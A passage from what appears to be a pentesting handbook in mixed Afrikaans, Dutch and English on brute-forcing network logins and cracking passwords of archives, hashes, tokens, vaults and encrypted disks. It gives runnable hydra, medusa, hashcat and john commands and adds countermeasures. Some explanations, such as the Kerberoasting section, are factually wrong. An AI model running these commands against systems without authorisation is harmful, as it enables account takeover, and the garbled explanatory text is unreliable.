- **Gebruik sleutelpare**: Gebruik SSH-sleutelpare in plaas van wagwoorde vir verifikasie. Dit bied 'n hoër vlak van beveiliging omdat die private sleutel nie oorgedra word nie.

Deur hierdie maatreëls te implementeer, kan jy die risiko van 'n suksesvolle brute force-aanval op jou SSH-stelsel verminder.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Swak SSH-sleutels / Debian voorspelbare PRNG

Sommige stelsels het bekende foute in die lukrake saad wat gebruik word om kriptografiese materiaal te genereer. Dit kan lei tot 'n drasties verminderde sleutelruimte wat met hulpmiddels soos [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gekraak kan word. Vooraf gegenereerde stelle swak sleutels is ook beskikbaar soos [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ en OpenMQ)

Die STOMP-teksprotokol is 'n wye gebruikte boodskapprotokol wat **naadlose kommunikasie en interaksie met gewilde boodskapwagdienste** soos RabbitMQ, ActiveMQ, HornetQ en OpenMQ moontlik maak. Dit bied 'n gestandaardiseerde en doeltreffende benadering om boodskappe uit te ruil en verskeie boodskapverrigtinge uit te voer.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet is 'n protokol wat gebruik word vir die kommunikasie met 'n bediener oor 'n netwerk. Dit maak dit moontlik om op afstand te verbind met 'n bediener en opdragte uit te voer. Telnet is 'n onveilige protokol omdat die inligting wat oorgedra word nie versleutel is nie. Dit beteken dat 'n aanvaller die inligting wat oorgedra word kan onderskep en lees.

#### Brute Force-aanvalle op Telnet

'n Brute Force-aanval op Telnet behels die gebruik van outomatiese sagteware om verskillende kombinasies van gebruikersname en wagwoorde te probeer om toegang tot 'n Telnet-bediening te verkry. Hierdie aanvalle is gebaseer op die feit dat baie gebruikers swak wagwoorde gebruik wat maklik te raai is. Die aanvaller sal 'n lys van algemene wagwoorde gebruik en dit een vir een probeer totdat 'n suksesvolle kombinasie gevind word.

#### Teenmaatreëls teen Brute Force-aanvalle op Telnet

Om jouself teen Brute Force-aanvalle op Telnet te beskerm, kan jy die volgende teenmaatreëls implementeer:

- Verander die standaard Telnet-poort na 'n ander poort om die aanvaller te verwar.
- Stel 'n sterk wagwoordbeleid in en moedig gebruikers aan om unieke en komplekse wagwoorde te gebruik.
- Beperk die aantal mislukte aanmeldingspogings om te voorkom dat 'n aanvaller herhaaldelik probeer om toegang te verkry.
- Implementeer tweefaktor-verifikasie om 'n ekstra laag van sekuriteit toe te voeg.
- Monitor die Telnet-loglêers vir verdagte aktiwiteit en neem onmiddellik aksie as 'n aanval gedetekteer word.

Deur hierdie teenmaatreëls te implementeer, kan jy die risiko van 'n suksesvolle Brute Force-aanval op Telnet verminder.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) is 'n protokol wat gebruik word om 'n grafiese gebruikerskoppelvlak (GUI) oor 'n netwerk te deel. Dit maak dit moontlik vir 'n gebruiker om 'n afgeleë rekenaar te bedien en toegang te verkry tot die grafiese omgewing daarvan. VNC kan gebruik word vir afstandbeheer, hulp op afstand, demonstrasies en ander toepassings waar 'n grafiese gebruikerskoppelvlak oor 'n netwerk gedeel moet word.

'n Brute force-aanval teen VNC behels die gebruik van 'n program of skripsie om verskeie kombinasies van gebruikersname en wagwoorde te probeer om toegang tot 'n VNC-bedieningspaneel te verkry. Hierdie aanval is effektief wanneer die gebruikersname en wagwoord swak of maklik te raai is. Dit is belangrik om sterk en unieke wagwoorde te gebruik om te voorkom dat 'n brute force-aanval suksesvol is.

Daar is verskeie hulpmiddels en tegnieke beskikbaar om 'n brute force-aanval teen VNC uit te voer. Dit sluit in die gebruik van hulpmiddels soos Hydra, Medusa en Ncrack, wat spesifiek ontwerp is vir die uitvoer van brute force-aanvalle. Dit is ook moontlik om 'n eie skripsie te skryf om 'n brute force-aanval teen VNC uit te voer.

Dit is belangrik om te onthou dat die uitvoer van 'n brute force-aanval teen VNC onwettig kan wees sonder die toestemming van die eienaar van die stelsel. Dit is altyd raadsaam om 'n wettige en etiese benadering tot hacking te volg en slegs toestemming te verkry om enige vorm van aanvalle uit te voer.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm is 'n protokol wat gebruik word om op afstand te bestuur en te bestuur Windows-masjiene. Dit maak gebruik van die HTTP-gebaseerde protokol om kommunikasie tussen die klient en die bediener te fasiliteer. Winrm maak gebruik van die SOAP-gebaseerde protokol vir die uitruil van boodskappe.

#### Brute Force-aanvalle teen Winrm

Brute force-aanvalle teen Winrm is 'n metode waar 'n aanvaller probeer om toegang te verkry tot 'n Windows-masjien deur verskeie wagwoorde te probeer. Hierdie aanvalle kan uitgevoer word deur gebruik te maak van gereedskap soos Hydra, Medusa of 'n aangepaste skripsie.

#### Voorkoming van Brute Force-aanvalle teen Winrm

Om brute force-aanvalle teen Winrm te voorkom, kan die volgende maatreëls geneem word:

- Stel 'n sterk wagwoordbeleid in wat vereis dat gebruikers sterk en unieke wagwoorde gebruik.
- Beperk die aantal toegewyde pogings wat 'n gebruiker kan maak om in te teken.
- Implementeer 'n tydvertraging tussen mislukte aanmeldingspogings.
- Monitor en analiseer loglêers vir verdagte aktiwiteit.
- Stel tweefaktor-verifikasie in vir aanmelding.

#### Aanbevole gereedskap vir Brute Force-aanvalle teen Winrm

Hier is 'n paar gereedskap wat gebruik kan word vir brute force-aanvalle teen Winrm:

- Hydra: 'n gereedskap wat gebruik word vir die outomatiese aanval van verskeie protokolle, insluitend Winrm.
- Medusa: 'n vinnige, modulêre en outomatiese gereedskap vir die aanval van verskeie protokolle.
- Ncrack: 'n hoogs aanpasbare gereedskap vir die aanval van verskeie protokolle, insluitend Winrm.

#### Aanbevole bestuurders vir Brute Force-aanvalle teen Winrm

Hier is 'n paar bestuurders wat gebruik kan word vir brute force-aanvalle teen Winrm:

- Wordlist: 'n lys van moontlike wagwoorde wat gebruik kan word vir die aanval.
- Woordenboek: 'n lys van algemene woorde wat gebruik kan word vir die aanval.
- Masker: 'n patroon wat gebruik kan word om wagwoorde te genereer.
- Regel: 'n reël wat gebruik kan word om wagwoorde te genereer deur spesifieke karakters in te sluit of uit te sluit.

#### Aanbevole tegnieke vir Brute Force-aanvalle teen Winrm

Hier is 'n paar tegnieke wat gebruik kan word vir brute force-aanvalle teen Winrm:

- Enkel wagwoordaanval: 'n aanval waar 'n enkele wagwoord herhaaldelik probeer word.
- Woordlystaanval: 'n aanval waar 'n lys van wagwoorde een vir een probeer word.
- Maskeraanval: 'n aanval waar 'n wagwoord gegenereer word deur 'n patroon te volg.
- Regelgebaseerde aanval: 'n aanval waar 'n wagwoord gegenereer word deur 'n spesifieke reël te volg.

#### Aanbevole maatreëls vir Brute Force-aanvalle teen Winrm

Hier is 'n paar maatreëls wat geneem kan word om brute force-aanvalle teen Winrm te beperk:

- Monitor die netwerk vir verdagte aktiwiteit en ongewone patrone.
- Stel 'n sterk wagwoordbeleid in wat vereis dat gebruikers sterk en unieke wagwoorde gebruik.
- Beperk die aantal toegewyde pogings wat 'n gebruiker kan maak om in te teken.
- Implementeer 'n tydvertraging tussen mislukte aanmeldingspogings.
- Stel tweefaktor-verifikasie in vir aanmelding.
- Verseker dat die bediener se sagteware en toepassings opgedateer word met die nuutste beveiligingspatches.
- Monitor en analiseer loglêers vir verdagte aktiwiteit.
- Stel 'n netwerkfirewall in om ongewenste toegang te beperk.
- Beperk die toegang tot die Winrm-diens tot slegs vertroude IP-adresse.
- Stel 'n stelsel van waarskuwings en alarms in om te reageer op verdagte aktiwiteit.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en outomaties werkstrome te bou met behulp van die wêreld se mees gevorderde gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Plaaslik

### Aanlyn kraakdatabasisse

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 met/sonder ESS/SSP en met enige uitdaging se waarde)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashe, WPA2-vangste, en argiewe MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashe)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashe en lêerhashe)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashe)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashe)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Kyk hierna voordat jy probeer om 'n Hash te kragtig te kraak.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Bekende teks zip-aanval

Jy moet die **teks** (of 'n deel van die teks) **van 'n lêer wat binne-in die versleutelde zip lê** ken. Jy kan die **lêernaam en grootte van lêers wat binne-in** 'n versleutelde zip lê uitvoer deur die volgende te hardloop: **`7z l encrypted.zip`**\
Laai [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) af van die vrystellingsbladsy.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z is 'n sterk kompressiehulpmiddel wat gebruik kan word om lêers en mappe te komprimeer en te ontspan. Dit ondersteun verskeie kompressie-algoritmes, insluitend LZMA en LZMA2. 7z kan ook wachtwoordbeskerming bied vir gekomprimeerde lêers. Hier is 'n paar nuttige bruto-kragte tegnieke wat gebruik kan word om 7z-wagwoorde te kraak:

#### 1. Woordelys-aanval

Hierdie tegniek behels die gebruik van 'n woordelys van potensiële wagwoorde om te probeer om die regte wagwoord te raai. Dit is 'n effektiewe metode as die wagwoord relatief swak is of as die aanvaller 'n idee het van wat die wagwoord kan wees. 'n Woordelys van algemene wagwoorde, soos woordeboekwoorde, persoonlike inligting of algemene kombinasies, kan gebruik word om die wagwoord te probeer raai.

#### 2. Brute-kragte aanval

Hierdie tegniek behels die outomatiese uitprobeer van alle moontlike kombinasies van karakters om die regte wagwoord te vind. Dit is 'n tydrowende proses, veral as die wagwoord lank en kompleks is. Dit kan egter effektief wees as die wagwoord nie sterk genoeg is nie. Die aanvaller kan verskillende kombinasies van karakters, soos letters, syfers en spesiale tekens, probeer om die wagwoord te kraak.

#### 3. Woordelys + Brute-kragte aanval

Hierdie tegniek is 'n kombinasie van die woordelys-aanval en brute-kragte aanval. Dit behels die gebruik van 'n woordelys van potensiële wagwoorde, gevolg deur die outomatiese uitprobeer van alle moontlike kombinasies van karakters. Dit kan 'n effektiewe metode wees as die wagwoord nie slegs uit 'n enkele woord bestaan nie, maar ook 'n kombinasie van woorde, syfers en spesiale tekens bevat.

Dit is belangrik om te onthou dat die gebruik van bruto-kragte tegnieke om wagwoorde te kraak, tydrowend kan wees en nie altyd suksesvol is nie. Dit is ook belangrik om etiese hacking beginsels te volg en slegs toestemming te verkry om hierdie tegnieke op 'n legitieme manier te gebruik.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

'n PDF-dokument is 'n digitale weergawe van 'n gedrukte dokument wat gebruik maak van die Portable Document Format (PDF). Dit is 'n algemeen gebruikte formaat vir die verspreiding van elektroniese dokumente, omdat dit die oorspronklike formatering en uitleg van die dokument behou, ongeag die bedryfstelsel of toestel waarop dit gelees word.

'n PDF-dokument kan verskillende soorte inhoud bevat, soos teks, afbeeldings, grafieke en selfs interaktiewe elemente soos vorms en skakels. Dit kan ook beveiligingsfunksies insluit, soos wagwoorde of versleuteling, om die toegang tot die inhoud te beperk.

Om 'n PDF-dokument te lees, kan jy 'n PDF-leser of -sienersagteware gebruik, wat beskikbaar is vir verskeie bedryfstelsels en toestelle. Hierdie sagteware stel jou in staat om die inhoud van die PDF te sien, te navigeer, te soek en selfs te druk.

As jy 'n PDF-dokument wil skep, kan jy dit doen deur 'n dokument in 'n toepaslike formaat (soos Microsoft Word of Adobe InDesign) te skep en dit dan na PDF te omskep deur gebruik te maak van 'n PDF-skepper of -drukker.

PDF-dokumente word wyd gebruik vir verskeie toepassings, soos elektroniese boeke, handleidings, verslae, kontrakte en vorms. Dit is 'n handige en veelsydige formaat wat die deling en bewaring van dokumente vergemaklik.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF Eienaar Wagwoord

Om 'n PDF Eienaar wagwoord te kraak, kyk hier: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM kraak

NTLM (New Technology LAN Manager) is 'n outentifikasieprotokol wat gebruik word in Windows-netwerke. Dit word gebruik om gebruikers te identifiseer en te verifieer wanneer hulle toegang tot 'n stelsel versoek. NTLM-kraak is 'n tegniek wat gebruik word om die wagwoorde van gebruikers te agterhaal deur 'n aanval uit te voer op die NTLM-hashwaardes.

#### Hoe werk NTLM-kraak?

1. Verkry die NTLM-hashwaardes: Die eerste stap in die NTLM-kraakproses is om die NTLM-hashwaardes te verkry. Hierdie hashwaardes word gewoonlik verkry deur 'n aanval uit te voer op 'n stelsel of deur 'n databasislek te benut.

2. Kies 'n kraakmetode: Daar is verskeie metodes wat gebruik kan word om NTLM-hashwaardes te kraak. Hierdie metodes sluit in woordelysaanvalle, woordelysgebaseerde aanvalle, bruto kragaanvalle en regenboogtafelgebaseerde aanvalle.

3. Voer die kraakuitvoering uit: Nadat 'n kraakmetode gekies is, word die kraakuitvoering uitgevoer. Dit behels die gebruik van sagteware of hulpmiddels wat spesifiek ontwerp is om NTLM-hashwaardes te kraak.

4. Analiseer die resultate: Nadat die kraakuitvoering voltooi is, moet die resultate geanaliseer word om suksesvol gekraakte wagwoorde te identifiseer.

#### Voorkoming van NTLM-kraak

Om die risiko van NTLM-kraak te verminder, kan die volgende maatreëls geneem word:

- Implementeer sterk wagwoordbeleide: Moedig gebruikers aan om sterk en unieke wagwoorde te gebruik en dwing beleide af wat wagwoordlengte, kompleksiteit en verandering vereis.

- Gebruik multifaktor-outentifikasie: Implementeer multifaktor-outentifikasie om 'n ekstra laag van beskerming toe te voeg deur 'n tweede vorm van outentifikasie te vereis, soos 'n eenmalige wagwoord of biometriese inligting.

- Monitor vir verdagte aktiwiteit: Monitor gereeld vir verdagte aktiwiteit, soos herhaalde mislukte aanmeldingspogings, om vinnig te reageer op enige potensiële aanvalle.

- Verseker stelsel- en toepassingsopdaterings: Verseker dat alle stelsels en toepassings op die nuutste weergawes en opdaterings gehou word om bekende kwesbaarhede te vermy.

- Beperk blootstelling van NTLM-hashwaardes: Beperk die blootstelling van NTLM-hashwaardes deur die gebruik van sterk kriptografieprotokolle en deur die implementering van beveiligingsmaatreëls soos die gebruik van gesoute wagwoorde.

- Opleiding en bewustmaking: Verskaf opleiding en bewustmaking aan gebruikers oor die risiko's van swak wagwoorde en die belangrikheid van goeie outentifikasiepraktyke.

#### Slotwoord

NTLM-kraak is 'n tegniek wat gebruik word om NTLM-hashwaardes te agterhaal en toegang tot 'n stelsel te verkry. Dit is belangrik om bewus te wees van hierdie aanvalstegniek en om toepaslike maatreëls te tref om die risiko daarvan te verminder. Deur sterk wagwoordbeleide te implementeer, multifaktor-outentifikasie te gebruik en gereeld vir verdagte aktiwiteit te monitor, kan organisasies hulself beskerm teen NTLM-kraak.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass is 'n open-source wagwoordbestuurder wat gebruik kan word om wagwoorde veilig te stoor en te bestuur. Dit bied 'n veilige manier om wagwoorde te bewaar en te gebruik deur middel van 'n versleutelde wagwoorddatabasis. Hierdie databasis kan 'n verskeidenheid wagwoorde en ander sensitiewe inligting bevat, soos gebruikersname, kredietkaartinligting en persoonlike notas.

Keepass maak gebruik van 'n meesterwagwoord om toegang tot die wagwoorddatabasis te verkry. Hierdie meesterwagwoord moet sterk en uniek wees om die veiligheid van die wagwoorde te verseker. Die wagwoorddatabasis word versleutel met behulp van algoritmes soos AES of Twofish, wat dit moeilik maak vir aanvallers om toegang tot die wagwoorde te verkry sonder die korrekte meesterwagwoord.

Keepass bied ook funksies soos wagwoordgenerering, wat unieke en sterk wagwoorde kan skep vir verskillende rekeninge en webwerwe. Dit maak dit makliker om veilige wagwoorde te gebruik sonder om dit self te moet onthou.

Danksy die open-source aard van Keepass, is dit deur die gemeenskap geoudit en getoets om die veiligheid en betroubaarheid daarvan te verseker. Dit is belangrik om die nuutste weergawe van Keepass te gebruik en om sekuriteitsopdaterings gereeld toe te pas om die risiko van aanvalle te verminder.

Keepass is 'n nuttige hulpmiddel vir individue en organisasies wat hul wagwoorde veilig wil hou en maklik wil bestuur. Dit bied 'n veilige en gerieflike manier om wagwoorde te bewaar en te gebruik sonder om dit self te moet onthou.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
#### Inleiding

Keberoasting is een aanvalstechniek die wordt gebruikt om zwakke wachtwoorden te achterhalen die zijn opgeslagen in de vorm van gehashte serviceaccountreferenties. Deze techniek maakt gebruik van de zwakte in de manier waarop sommige serviceaccounts hun wachtwoorden opslaan in Active Directory (AD) of andere LDAP-diensten.

#### Achtergrond

Bij het opslaan van wachtwoorden in AD of andere LDAP-diensten worden de wachtwoorden gehasht en vervolgens opgeslagen in het attribuut "userPassword" van het serviceaccountobject. Het hash-algoritme dat wordt gebruikt, is meestal eenzijdig en niet-reversibel, wat betekent dat het oorspronkelijke wachtwoord niet kan worden hersteld uit de hash.

Een zwakte in dit proces is dat sommige serviceaccounts hun wachtwoorden opslaan met behulp van een zwakke hashfunctie, zoals MD5 of SHA-1. Deze zwakke hashfuncties maken het mogelijk om de gehashte wachtwoorden offline te kraken door middel van brute-force-aanvallen.

#### Keberoasting-aanval

Bij een keberoasting-aanval probeert een aanvaller toegang te krijgen tot de gehashte wachtwoorden van serviceaccounts in AD of andere LDAP-diensten. De aanvaller kan dit doen door toegang te krijgen tot het serviceaccountobject en de gehashte wachtwoorden te extraheren.

Vervolgens kan de aanvaller de gehashte wachtwoorden offline kraken door middel van brute-force-aanvallen. Dit houdt in dat de aanvaller verschillende combinaties van wachtwoorden probeert totdat de juiste overeenkomt met de gehashte waarde.

Als de aanvaller erin slaagt een zwak wachtwoord te kraken, kan hij dit gebruiken om toegang te krijgen tot het betreffende serviceaccount en mogelijk verdere aanvallen uit te voeren.

#### Mitigatie

Om keberoasting-aanvallen te voorkomen, moeten organisaties sterke wachtwoorden afdwingen voor serviceaccounts en ervoor zorgen dat ze worden opgeslagen met behulp van sterke hashfuncties, zoals bcrypt of PBKDF2. Daarnaast moeten organisaties regelmatig controleren op zwakke wachtwoorden en deze wijzigen om potentiële aanvallers te dwarsbomen.

Het is ook belangrijk om de toegangsrechten tot serviceaccountobjecten te beperken, zodat alleen geautoriseerde gebruikers toegang hebben tot de gehashte wachtwoorden.

#### Conclusie

Keberoasting is een aanvalstechniek die gebruikmaakt van zwakke wachtwoorden die zijn opgeslagen in de vorm van gehashte serviceaccountreferenties. Door het offline kraken van deze gehashte wachtwoorden kunnen aanvallers toegang krijgen tot serviceaccounts en verdere aanvallen uitvoeren. Organisaties moeten sterke wachtwoorden afdwingen, sterke hashfuncties gebruiken en de toegangsrechten tot serviceaccountobjecten beperken om keberoasting-aanvallen te voorkomen.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks beeld

#### Metode 1

Installeer: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Metode 2

Brute force is a common method used in hacking to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords until the correct one is found. This method is effective when the password is weak or easily guessable.

To perform a brute force attack, you need a tool or script that can automate the process of trying different passwords. There are many tools available for this purpose, such as Hydra, Medusa, and THC-Hydra.

Before starting a brute force attack, it is important to gather information about the target system or account. This includes identifying the login page or service, determining the username or email address associated with the account, and understanding any password complexity requirements.

Once you have this information, you can start the brute force attack by running the tool or script and specifying the target system or account, the username or email address, and a list of possible passwords to try. The tool will then systematically try each password until it finds the correct one or exhausts all possibilities.

It is worth noting that brute force attacks can be time-consuming and resource-intensive, especially if the password is long and complex. To speed up the process, attackers may use techniques such as password dictionaries, which contain commonly used passwords, or password cracking tools that leverage the power of GPUs to perform calculations faster.

To protect against brute force attacks, system administrators can implement measures such as account lockouts after a certain number of failed login attempts, strong password policies, and multi-factor authentication. Additionally, users should avoid using weak or easily guessable passwords and regularly update their passwords to minimize the risk of being compromised through brute force attacks.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
'n Ander Luks BF-tutoriaal: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Privaatsleutel

'n PGP/GPG privaatsleutel is 'n belangrike komponent van 'n kriptografiese stelsel wat gebruik word vir die versleuteling en ontsleuteling van boodskappe. Dit is 'n unieke sleutel wat slegs bekend is by die eienaar en gebruik word om boodskappe te onderteken en te ontsleutel. Die privaatsleutel moet streng geheim gehou word, aangesien dit die toegang tot die versleutelde boodskappe verseker.

Wanneer 'n boodskap versleutel word met 'n publieke sleutel, kan dit slegs ontsleutel word met die ooreenstemmende privaatsleutel. Dit verseker dat slegs die beoogde ontvanger toegang tot die boodskap het. Daarom is dit van kritieke belang om die privaatsleutel veilig te hou en te beskerm teen onbevoegde toegang.

As 'n aanvaller toegang tot 'n privaatsleutel verkry, kan dit gebruik word om versleutelde boodskappe te ontsleutel en selfs valse boodskappe te onderteken. Dit is dus noodsaaklik om die privaatsleutel te beskerm deur dit te verseker met 'n sterk wagwoord en dit op 'n veilige plek te bewaar.

Om die risiko van 'n privaatsleutel-lek te verminder, is dit raadsaam om 'n sterk en uniek wagwoord te gebruik, die sleutel op 'n veilige stoorplek te bewaar en slegs te gebruik op vertroude toestelle. Dit is ook belangrik om die privaatsleutel gereeld te hergenereer en ou sleutels te herroep as dit nodig is.

Die beskerming van jou privaatsleutel is van kritieke belang vir die veilige kommunikasie en versekering van die integriteit van jou versleutelde boodskappe.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Meester Sleutel

Gebruik [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) en dan john

### Open Office Kolom met wagwoordbeskerming

As jy 'n xlsx-lêer het met 'n kolom wat deur 'n wagwoord beskerm word, kan jy dit onbeskerm:

* **Laai dit op na Google Drive** en die wagwoord sal outomaties verwyder word
* Om dit **handmatig te verwyder**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX Sertifikate

'n PFX-sertifikaat is 'n formaat vir die stoor van privaat sleutels, sertifikate en tussenliggende sertifikate. Dit word dikwels gebruik in die beveiliging van webbedieners en vir die versleuteling van e-posse. 'n PFX-sertifikaat kan ook gebruik word om digitale handtekeninge te skep en te verifieer.

'n PFX-sertifikaat kan met 'n wagwoord beskerm word om die privaat sleutel te verseker dat dit veilig bly. Dit kan ook geëksporteer en ingevoer word tussen verskillende toepassings en bedieners.

Om 'n PFX-sertifikaat te kraak, kan 'n aanvaller 'n bruto-krag-aanval gebruik. Hierdie aanval behels die outomatiese poging van verskillende moontlike wagwoorde totdat die regte een gevind word. Dit kan tydrowend wees, maar as die wagwoord swak is, kan dit suksesvol wees.

